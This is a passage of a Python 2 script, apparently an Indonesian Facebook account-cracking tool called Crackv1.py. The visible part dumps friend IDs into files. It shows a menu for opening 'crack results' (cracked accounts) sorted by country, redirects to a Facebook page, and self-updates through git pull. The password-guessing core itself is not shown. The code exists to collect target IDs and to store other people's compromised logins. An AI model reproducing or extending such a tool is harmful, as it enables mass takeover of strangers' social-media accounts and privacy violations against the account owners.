            print '\r\x1b[0;97m(\x1b[0;97m' + str(len(idfromteman)) + '\x1b[0;97m)\x1b[0;94m >\x1b[0;97m',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[0;97m ' + a['id']

        bz.close()
        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x9c\x93 \x1b[0;97m)\x1b[0;97m Sukses Mengambil ID \x1b[0;97m....'
        print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID : %s' % len(idfromteman)
        done = raw_input('\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) \x1b[0;97mSimpan Nama File : ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[0;97m(\x1b[0;92m \xe2\x88\x9a \x1b[0;97m) File tersimpan : out/' + done
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except OSError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) File tidak tersimpan '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 Crackv1.py')
    except IOError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Error creating file'
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        os.system('python2 Crackv1.py')
    except (KeyboardInterrupt, EOFError):
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Terhenti '
        raw_input('\n\x1b[0;97m(\x1b[0;91mKembali\x1b[0;97m)')
        dump()
    except KeyError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Teman tidak ada !'
        raw_input('\n\x1b[0;97m(\x1b[0;91mkembali\x1b[0;97m)')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Tidak ada koneksi !'
        keluar()


def lihat_hasil():
    os.system('clear')
    print ' '
    print logo3
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m)\x1b[1;97m Hasil Crack ID Indonesia'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Hasil Crack ID Bangladesh'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Hasil Crack ID Usa'
    print '\x1b[1;94m(\x1b[1;97m4\x1b[1;94m)\x1b[1;97m Hasil Crack ID Pakistan & India'
    print '\x1b[1;94m(\x1b[1;97m5\x1b[1;94m)\x1b[1;97m Hasil Crack ID Malaysia'
    print '\x1b[1;94m(\x1b[1;97m6\x1b[1;94m)\x1b[1;97m Hasil Crack ID Thailand'
    print '\x1b[1;94m(\x1b[1;97m7\x1b[1;94m)\x1b[1;97m Hasil Crack ID Korea'
    print '\x1b[1;94m(\x1b[1;97m8\x1b[1;94m)\x1b[1;97m Hasil Crack ID Japan (Kakek Sugiono)'
    print '\x1b[1;94m(\x1b[1;97m9\x1b[1;94m)\x1b[1;97m Hasil Crack ID Singapura'
    print '\x1b[1;94m(\x1b[1;97m10\x1b[1;94m)\x1b[1;97m Hasil Crack ID Vietnam'
    print '\x1b[1;94m(\x1b[1;97m11\x1b[1;94m) \x1b[1;97mHasil Crack ID Israel'
    print '\x1b[1;94m(\x1b[1;97m12\x1b[1;94m)\x1b[1;97m Hasil Crack ID Fhilipina'
    print '\x1b[1;94m(\x1b[1;97m13\x1b[1;94m) \x1b[1;97mHasil Crack ID Prancis'
    print '\x1b[1;94m(\x1b[1;97m14\x1b[1;94m) \x1b[1;97mHasil Crack ID Turky'
    print '\x1b[1;94m(\x1b[1;97m15\x1b[1;94m) \x1b[1;97mHasil Crack ID Saudi Arabia'
    print '\x1b[1;94m(\x1b[1;97m16\x1b[1;94m)\x1b[1;97m Hasil Crack ID Dari Postingan Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m17\x1b[1;94m) \x1b[1;97mHasil Crack ID Dari Total Followers'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_hasil()


def pilih_hasil():
    keak = raw_input('\x1b[1;97m(?) Pilih \x1b[1;94m>\x1b[1;97m ')
    if keak == '':
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Isi Yg Benar Sayang!'
        pilih_hasil()
    elif keak == '1':
        os.system('xdg-open done/indo.txt')
        lihat_hasil()
    elif keak == '2':
        os.system('xdg-open done/bangla.txt')
        lihat_hasil()
    elif keak == '3':
        os.system('xdg-open done/usa.txt')
        lihat_hasil()
    elif keak == '4':
        os.system('xdg-open done/pakis_hindi.txt')
        lihat_hasil()
    elif keak == '5':
        os.system('xdg-open done/malay.txt')
        lihat_hasil()
    elif keak == '6':
        os.system('xdg-open done/thai.txt')
        lihat_hasil()
    elif keak == '7':
        os.system('xdg-open done/korea.txt')
        lihat_hasil()
    elif keak == '8':
        os.system('xdg-open done/japan.txt')
        lihat_hasil()
    elif keak == '9':
        os.system('xdg-open done/singa.txt')
        lihat_hasil()
    elif keak == '10':
        os.system('xdg-open done/viet.txt')
        lihat_hasil()
    elif keak == '11':
        os.system('xdg-open done/israel.txt')
        lihat_hasil()
    elif keak == '12':
        os.system('xdg-open done/fhilip.txt')
        lihat_hasil()
    elif keak == '13':
        os.system('xdg-open done/prancis.txt')
        lihat_hasil()
    elif keak == '14':
        os.system('xdg-open done/turkey.txt')
        lihat_hasil()
    elif keak == '15':
        os.system('xdg-open done/saudi.txt')
        lihat_hasil()
    elif keak == '16':
        os.system('xdg-open done/post.txt')
        lihat_hasil()
    elif keak == '17':
        os.system('xdg-open done/follow.txt')
        lihat_hasil()
    elif keak == '0':
        menu()
    else:
        print '\x1b[0;97m(\x1b[0;91m!\x1b[0;97m) Isi Yg Benar Sayang!'


def ambil_cookie():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    jalan('        \x1b[92mAnda Akan Di Arahkan Ke Browser')
    os.system('xdg-open https://www.facebook.com/ijakssquad')
    menu()


def follow():
    os.system('clear')
    print logo
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    jalan('        \x1b[92mAnda Akan Di Arahkan Ke Browser')
    os.system('xdg-open https://www.facebook.com/ijakssquad')
    menu()


def perbarui():
    os.system('clear')
    print logo
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    jalan('\x1b[1;92mMemperbarui Script ...\x1b[1;93m')
    os.system('git pull origin master')
    raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
    os.system('python2 Crackv1.py')


if __name__ == '__main__':
    menu()
    masuk()
